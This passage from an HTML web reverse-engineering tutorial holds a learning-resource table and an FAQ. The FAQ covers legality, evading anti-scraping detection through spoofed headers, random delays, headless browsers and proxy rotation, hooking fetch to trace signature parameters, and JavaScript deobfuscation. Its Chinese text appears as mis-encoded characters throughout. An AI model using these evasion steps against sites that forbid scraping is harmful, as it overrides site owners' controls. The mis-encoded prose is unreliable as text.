<li>âœ… å†™ 1 ç¯‡å­¦ä¹ ç¬”è®°</li>
</ul>
<hr />
<h2>ä¿æŒæ›´æ–°</h2>
<h3>æŠ€æœ¯èµ„è®¯</h3>
<table>
<thead>
<tr>
  <th>æ›´æ–°é¢‘ç‡</th>
  <th>æ¨èèµ„æº</th>
  <th>é“¾æ¥</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>æ¯æ—¥å¿…çœ‹</strong></td>
  <td>Hacker News</td>
  <td>https://news.ycombinator.com/</td>
</tr>
<tr>
  <td><strong>æ¯æ—¥å¿…çœ‹</strong></td>
  <td>GitHub Trending</td>
  <td>https://github.com/trending</td>
</tr>
<tr>
  <td><strong>æ¯å‘¨æ¨è</strong></td>
  <td>JavaScript Weekly</td>
  <td>https://javascriptweekly.com/</td>
</tr>
<tr>
  <td><strong>æ¯å‘¨æ¨è</strong></td>
  <td>Web Tools Weekly</td>
  <td>https://webtoolsweekly.com/</td>
</tr>
<tr>
  <td><strong>æ¯æœˆå…³æ³¨</strong></td>
  <td>MDN Web Docs æ›´æ–°æ—¥å¿—</td>
  <td>-</td>
</tr>
<tr>
  <td><strong>æ¯æœˆå…³æ³¨</strong></td>
  <td>Chrome/Firefox æ–°ç‰ˆæœ¬ç‰¹æ€§</td>
  <td>-</td>
</tr>
</tbody>
</table>
<hr />
<h3>è·Ÿè¿›æŠ€æœ¯è¶‹åŠ¿</h3>
<table>
<thead>
<tr>
  <th>å…³æ³¨ç‚¹</th>
  <th>ç¤ºä¾‹</th>
</tr>
</thead>
<tbody>
<tr>
  <td><strong>å…³æ³¨æ–°å·¥å…·</strong></td>
  <td>Bunã€Denoã€Fresh ç­‰</td>
</tr>
<tr>
  <td><strong>å­¦ä¹ æ–°æ ‡å‡†</strong></td>
  <td>ES2024ã€HTTP/3</td>
</tr>
<tr>
  <td><strong>äº†è§£æ–°æŠ€æœ¯</strong></td>
  <td>AI è¾…åŠ©é€†å‘ã€è‡ªåŠ¨åŒ–æµ‹è¯•</td>
</tr>
<tr>
  <td><strong>è®¢é˜…åšå®¢</strong></td>
  <td>RSS è®¢é˜…å–œæ¬¢çš„æŠ€æœ¯åšå®¢</td>
</tr>
</tbody>
</table>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-81">å¼€æºé¡¹ç›®æ¨è</a></li>
<li><a href="#section-83">å¸¸è§é—®é¢˜ FAQ</a></li>
<li><a href="#section-25">é€†å‘å·¥ç¨‹å·¥ä½œæµ</a></li>
<li><a href="#section-15">æµè§ˆå™¨å¼€å‘è€…å·¥å…·</a></li>
</ul>

                                            </div>
                                            
                                            <div class="section" id="section-83">
                                                <h2>[R82] FAQ</h2>
                                                <h1>R82: å¸¸è§é—®é¢˜ (FAQ)</h1>
<h2>æ¦‚è¿°</h2>
<p>æœ¬ç« æ±‡æ€»äº† Web é€†å‘å·¥ç¨‹ä¸­çš„å¸¸è§é—®é¢˜å’Œè§£ç­”ï¼Œå¸®åŠ©ä½ å¿«é€Ÿè§£å†³å¸¸è§å›°æƒ‘ã€‚</p>
<hr />
<h2>å…¥é—¨é—®é¢˜</h2>
<h3>Q1: å­¦ä¹  Web é€†å‘éœ€è¦å“ªäº›åŸºç¡€çŸ¥è¯†ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<p><strong>å¿…å¤‡åŸºç¡€</strong>:</p>
<ol>
<li><strong>HTTP/HTTPS åè®®</strong>: ç†è§£è¯·æ±‚/å“åº”ã€çŠ¶æ€ç ã€å¤´éƒ¨</li>
<li><strong>JavaScript åŸºç¡€</strong>: å˜é‡ã€å‡½æ•°ã€é—­åŒ…ã€åŸå‹é“¾ã€å¼‚æ­¥ç¼–ç¨‹</li>
<li><strong>HTML/CSS</strong>: DOM ç»“æ„ã€é€‰æ‹©å™¨</li>
<li><strong>å¼€å‘è€…å·¥å…·</strong>: Chrome DevTools åŸºæœ¬ä½¿ç”¨</li>
</ol>
<p><strong>æ¨èæŒæ¡</strong>:</p>
<ol>
<li>Python/Node.js ç¼–ç¨‹</li>
<li>æ­£åˆ™è¡¨è¾¾å¼</li>
<li>åŸºç¡€åŠ å¯†ç®—æ³•ï¼ˆMD5ã€SHAã€AESï¼‰</li>
<li>ç½‘ç»œæŠ“åŒ…å·¥å…·ï¼ˆBurp Suiteã€Charlesï¼‰</li>
</ol>
<p><strong>å¯é€‰è¿›é˜¶</strong>:</p>
<ol>
<li>æ•°æ®ç»“æ„ä¸ç®—æ³•</li>
<li>ç¼–è¯‘åŸç†ï¼ˆASTï¼‰</li>
<li>WebAssembly</li>
<li>å¯†ç å­¦</li>
</ol>
<hr />
<h3>Q2: æˆ‘åº”è¯¥ä»å“ªé‡Œå¼€å§‹å­¦ä¹ ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<p><strong>æ¨èå­¦ä¹ è·¯çº¿</strong>:</p>
<p><strong>ç¬¬ä¸€é˜¶æ®µï¼šåŸºç¡€å…¥é—¨ï¼ˆ1-2 å‘¨ï¼‰</strong></p>
<ol>
<li>å­¦ä¹  HTTP åè®®å’Œæµè§ˆå™¨å·¥ä½œåŸç†</li>
<li>ç†Ÿç»ƒä½¿ç”¨ Chrome DevToolsï¼ˆNetworkã€Sourcesã€Consoleï¼‰</li>
<li>æŒæ¡ JavaScript åŸºç¡€è¯­æ³•</li>
</ol>
<p><strong>ç¬¬äºŒé˜¶æ®µï¼šå·¥å…·ä½¿ç”¨ï¼ˆ1-2 å‘¨ï¼‰</strong></p>
<ol>
<li>å­¦ä¹  Burp Suite æˆ– Charles æŠ“åŒ…</li>
<li>äº†è§£ Puppeteer/Playwright åŸºæœ¬ç”¨æ³•</li>
<li>ç»ƒä¹ ç®€å•çš„çˆ¬è™«é¡¹ç›®</li>
</ol>
<p><strong>ç¬¬ä¸‰é˜¶æ®µï¼šæŠ€æœ¯æå‡ï¼ˆ2-4 å‘¨ï¼‰</strong></p>
<ol>
<li>å­¦ä¹  JavaScript åæ··æ·†</li>
<li>ç†è§£å¸¸è§åŠ å¯†ç®—æ³•</li>
<li>æŒæ¡ Hook æŠ€æœ¯</li>
</ol>
<p><strong>ç¬¬å››é˜¶æ®µï¼šå®æˆ˜æ¼”ç»ƒï¼ˆæŒç»­ï¼‰</strong></p>
<ol>
<li>åˆ†æçœŸå®ç½‘ç«™æ¡ˆä¾‹</li>
<li>å‚ä¸ CTF æ¯”èµ›</li>
<li>é˜…è¯»ä¼˜ç§€å¼€æºé¡¹ç›®</li>
</ol>
<hr />
<h3>Q3: Web é€†å‘åˆæ³•å—ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<p><strong>åˆæ³•æ€§å–å†³äºç›®çš„å’Œæ–¹å¼</strong>:</p>
<p><strong>âœ… åˆæ³•åœºæ™¯</strong>:</p>
<ul>
<li>å­¦ä¹ å’Œç ”ç©¶ç›®çš„</li>
<li>è‡ªå·±ç½‘ç«™çš„å®‰å…¨æµ‹è¯•</li>
<li>è·å¾—æˆæƒçš„æ¸—é€æµ‹è¯•</li>
<li>CTF æ¯”èµ›</li>
<li>å¼€æºé¡¹ç›®åˆ†æ</li>
</ul>
<p><strong>âŒ éæ³•åœºæ™¯</strong>:</p>
<ul>
<li>æœªç»æˆæƒè®¿é—®ä»–äººç³»ç»Ÿ</li>
<li>çªƒå–æ•æ„Ÿæ•°æ®</li>
<li>æ¶æ„æ”»å‡»ç½‘ç«™</li>
<li>ä¾µçŠ¯çŸ¥è¯†äº§æƒ</li>
<li>è¿åç”¨æˆ·åè®®ï¼ˆToSï¼‰</li>
</ul>
<p><strong>å»ºè®®</strong>:</p>
<ol>
<li>éµå®ˆ <code>robots.txt</code></li>
<li>å°Šé‡ç½‘ç«™çš„æœåŠ¡æ¡æ¬¾</li>
<li>ä¸è¦è¿›è¡Œ DDoS æ”»å‡»</li>
<li>ä¸è¦çˆ¬å–æ•æ„Ÿä¸ªäººä¿¡æ¯</li>
<li>è®¾ç½®åˆç†çš„è¯·æ±‚é¢‘ç‡</li>
</ol>
<hr />
<h2>æŠ€æœ¯é—®é¢˜</h2>
<h3>Q4: å¦‚ä½•ç»•è¿‡åçˆ¬è™«æ£€æµ‹ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<p><strong>åˆ†å±‚å¯¹æŠ—ç­–ç•¥</strong>:</p>
<p><strong>ç¬¬ä¸€å±‚ï¼šåŸºç¡€ä¼ªè£…</strong></p>
<pre><code class="language-python">headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) ...',
    'Referer': 'https://example.com/',
    'Accept': 'text/html,application/xhtml+xml,application/xml',
    'Accept-Language': 'zh-CN,zh;q=0.9,en;q=0.8',
}
</code></pre>
<p><strong>ç¬¬äºŒå±‚ï¼šè¡Œä¸ºæ¨¡æ‹Ÿ</strong></p>
<pre><code class="language-python">import time
import random

time.sleep(random.uniform(1, 3))  # éšæœºå»¶è¿Ÿ
</code></pre>
<p><strong>ç¬¬ä¸‰å±‚ï¼šä½¿ç”¨çœŸå®æµè§ˆå™¨</strong></p>
<pre><code class="language-python">from playwright.sync_api import sync_playwright

with sync_playwright() as p:
    browser = p.chromium.launch()
    page = browser.new_page()
    page.goto('https://example.com')
</code></pre>
<p><strong>ç¬¬å››å±‚ï¼šä»£ç†è½®æ¢</strong></p>
<pre><code class="language-python">proxies = ['http://proxy1.com:8080', 'http://proxy2.com:8080']
proxy = random.choice(proxies)
</code></pre>
<p>è¯¦è§: <a href="#section-37">åçˆ¬è™«æŠ€æœ¯æ·±åº¦åˆ†æ</a></p>
<hr />
<h3>Q5: å¦‚ä½•æ‰¾åˆ°åŠ å¯†å‚æ•°çš„ç”Ÿæˆä½ç½®ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<p><strong>æ–¹æ³•ä¸€ï¼šå…¨å±€æœç´¢</strong></p>
<ol>
<li>æ‰“å¼€ DevTools -&gt; Sources</li>
<li><code>Ctrl+Shift+F</code> å…¨å±€æœç´¢å‚æ•°åï¼ˆå¦‚ <code>sign</code>ï¼‰</li>
<li>æŸ¥çœ‹æ¯ä¸ªç»“æœï¼Œæ‰¾åˆ°èµ‹å€¼ä½ç½®</li>
</ol>
<p><strong>æ–¹æ³•äºŒï¼šXHR æ–­ç‚¹</strong></p>
<ol>
<li>DevTools -&gt; Sources -&gt; XHR/fetch Breakpoints</li>
<li>æ·»åŠ  URL å…³é”®è¯ï¼ˆå¦‚ <code>/api/</code>ï¼‰</li>
<li>åˆ·æ–°é¡µé¢ï¼Œæ–­ç‚¹åœä¸‹</li>
<li>æŸ¥çœ‹ Call Stackï¼Œå®šä½ç”Ÿæˆå‡½æ•°</li>
</ol>
<p><strong>æ–¹æ³•ä¸‰ï¼šHook æ‹¦æˆª</strong></p>
<pre><code class="language-javascript">const originalFetch = window.fetch;
window.fetch = function (...args) {
  console.log(&quot;[Fetch]&quot;, args);
  debugger; // è‡ªåŠ¨æ–­ç‚¹
  return originalFetch.apply(this, args);
};
</code></pre>
<p>è¯¦è§: <a href="#section-26">è°ƒè¯•æŠ€å·§ä¸æ–­ç‚¹è®¾ç½®</a></p>
<hr />
<h3>Q6: JavaScript ä»£ç è¢«æ··æ·†äº†æ€ä¹ˆåŠï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<p><strong>åˆ†æ­¥è¿˜åŸ</strong>:</p>
<p><strong>ç¬¬ä¸€æ­¥ï¼šæ ¼å¼åŒ–</strong></p>
<pre><code class="language-bash"># ä½¿ç”¨ Prettier
prettier --write obfuscated.js
</code></pre>
<p><strong>ç¬¬äºŒæ­¥ï¼šè¯†åˆ«æ··æ·†ç±»å‹</strong></p>
<ul>
<li>å˜é‡åæ··æ·†ï¼š<code>_0x1a2b</code></li>
<li>å­—ç¬¦ä¸²æ•°ç»„ï¼š<code>var arr = ['str1', 'str2']</code></li>
<li>æ§åˆ¶æµå¹³å¦åŒ–ï¼š<code>switch-case</code> ç»“æ„</li>
</ul>
<p><strong>ç¬¬ä¸‰æ­¥ï¼šä½¿ç”¨å·¥å…·</strong></p>
<ul>
<li>åœ¨çº¿å·¥å…·: https://lelinhtinh.github.io/de4js/</li>
<li>AST å·¥å…·: Babel</li>
<li>Webpack åæ‰“åŒ…: webcrack</li>
</ul>
<p><strong>ç¬¬å››æ­¥ï¼šæ‰‹åŠ¨åˆ†æ</strong></p>
<ul>
<li>åŠ¨æ€è°ƒè¯•ä¼˜äºé™æ€åˆ†æ</li>
<li>ç»“åˆ DevTools æ–­ç‚¹</li>
<li>ç†è§£æ ¸å¿ƒé€»è¾‘å³å¯ï¼Œæ— éœ€å®Œå…¨è¿˜åŸ</li>
</ul>
<p>è¯¦è§: <a href="#section-32">JavaScript åæ··æ·†</a></p>
<hr />
<h3>Q7: å¦‚ä½•å¤„ç†åŠ¨æ€åŠ è½½çš„å†…å®¹ï¼Ÿ</h3>
<p><strong>A</strong>:</p>
<p><strong>æ–¹æ³•ä¸€ï¼šPuppeteer ç­‰å¾…åŠ è½½</strong></p>
<pre><code class="language-javascript">await page.goto(&quot;https://example.com&quot;);

// ç­‰å¾…ç‰¹å®šå…ƒç´ å‡ºç°
await page.waitForSelector(&quot;.item&quot;);

// ç­‰å¾…ç½‘ç»œç©ºé—²
await page.waitForNetworkIdle();
</code></pre>
<p><strong>æ–¹æ³•äºŒï¼šSelenium ç­‰å¾…</strong></p>
<pre><code class="language-python">from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC

wait = WebDriverWait(driver, 10)
element = wait.until(EC.presence_of_element_located((By.CLASS_NAME, 'item')))
</code></pre>
<p><strong>æ–¹æ³•ä¸‰ï¼šåˆ†æ AJAX è¯·æ±‚</strong></p>
<ol>
<li>ç›´æ¥åˆ†æåŠ¨æ€å†…å®¹çš„ API è¯·æ±‚</li>
<li>è·³è¿‡é¡µé¢æ¸²æŸ“ï¼Œç›´æ¥è¯·æ±‚ API</li>
<li>æ•ˆç‡æ›´é«˜</li>
</ol>
<hr />
<h2>ç›¸å…³ç« èŠ‚</h2>
<ul>
<li><a href="#section-82">å­¦ä¹ èµ„æº</a></li>
<li><a href="#section-81">å¼€æºé¡¹ç›®æ¨è</a></li>
<li><a href="#section-25">é€†å‘å·¥ç¨‹å·¥ä½œæµ</a></li>
</ul>

                                            </div>
                                            </div>
        </body>
        </html>
        